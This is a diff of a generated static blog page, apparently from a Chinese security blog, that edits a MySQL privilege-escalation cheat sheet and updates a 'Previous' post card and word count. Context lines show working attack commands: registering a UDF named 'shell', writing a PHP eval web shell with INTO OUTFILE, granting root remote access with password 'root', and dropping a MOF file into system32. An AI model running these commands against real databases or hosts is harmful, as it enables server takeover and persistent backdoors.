@@ -426,7 +426,7 @@
 注册函数：CREATE FUNCTION shell RETURNS STRING SONAME &#39;udf.dll&#39;;
 查版本：select version();
 写文件：select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39; into outfile &#39;F://a.php&#39;;
-开外连：GRANT ALL PRIVILEGES ON . TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;root&#39; WITH GRANT OPTION;
+开外连：GRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;root&#39; WITH GRANT OPTION;
 移动文件：select load_file(&#39;C:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;
 </code></pre><h2 id="查找root密码"><a href="#查找root密码" class="headerlink" title="查找root密码"></a>查找root密码</h2><p>利用mysql提权的三种方式均需要获取mysql数据库最高权限root的帐号密码。所以我们先讨论下如何获取mysql的root密码：<br>root密码密文存放在：mysql数据库存储目录/mysq/user.myd中，低权限下可以用以下命令读取</p>
 <pre><code>mysql&gt; select @@datadir;
@@ -775,30 +775,28 @@ about 说明与帮助函数;
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2019/07/16/mysql-mof-udf-fan-dan-duan-kou-ti-quan/">
+                <a href="/2019/07/20/wen-jian-shang-chuan-rao-guo-zi-shi-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="mysql MOF UDF 反弹端口提权">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="文件上传绕过姿势总结">
                         
-                        <span class="card-title">mysql MOF UDF 反弹端口提权</span>
+                        <span class="card-title">文件上传绕过姿势总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            数据库提权常用的命令查询数据库路径：select @@basedir as basePath from dual;
-查询用户及密码：select * from mysql.user;
-注册函数：CREATE FUNCTION shell R
+                            为什么有文件上传漏洞？上传文件时，如果服务器端没有对客户端上传的文件作严格的过滤和验证，就可以造成任意文件上传的漏洞，上传的脚本文件包括(asp,aspx,php,jsp等)
+绕过前端检测绕过如果控制文件上传的地方只有简单的前端验证，就是上
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-16
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-20
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -807,12 +805,11 @@ about 说明与帮助函数;
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/提权/" target="_blank">
-                        <span class="chip bg-color">提权</span>
+                    <a href="/tags/文件上传/" target="_blank">
+                        <span class="chip bg-color">文件上传</span>
                     </a>
                     
                 </div>
@@ -979,7 +976,7 @@ about 说明与帮助函数;
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">22.3k</span>
+                <span class="white-color">23.8k</span>
             
 
             
